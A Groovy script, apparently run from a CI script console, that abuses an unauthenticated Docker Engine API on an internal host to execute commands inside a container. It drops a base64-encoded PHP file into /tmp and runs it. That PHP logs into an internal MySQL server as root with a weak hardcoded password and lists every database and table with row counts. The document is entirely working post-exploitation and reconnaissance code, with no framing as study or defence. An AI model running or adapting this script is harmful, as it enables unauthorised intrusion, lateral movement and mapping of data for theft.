import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$c=new mysqli("172.27.141.4","root","password","",3306);
if($c->connect_error){die("FAIL:".$c->connect_error);}

echo "=== DATABASES ===\n";
$r=$c->query("SHOW DATABASES");
$dbs=[];
while($row=$r->fetch_row()){echo $row[0]."\n";$dbs[]=$row[0];}

echo "\n=== TABLES PER DB ===\n";
foreach($dbs as $db){
    $r2=$c->query("SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='$db' ORDER BY TABLE_ROWS DESC");
    if($r2 && $r2->num_rows>0){
        echo "\n--- $db ---\n";
        while($row=$r2->fetch_row()){echo "$row[0]|$row[1]\n";}
    }
}

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(30000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/t1root.php && php /tmp/t1root.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(60000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
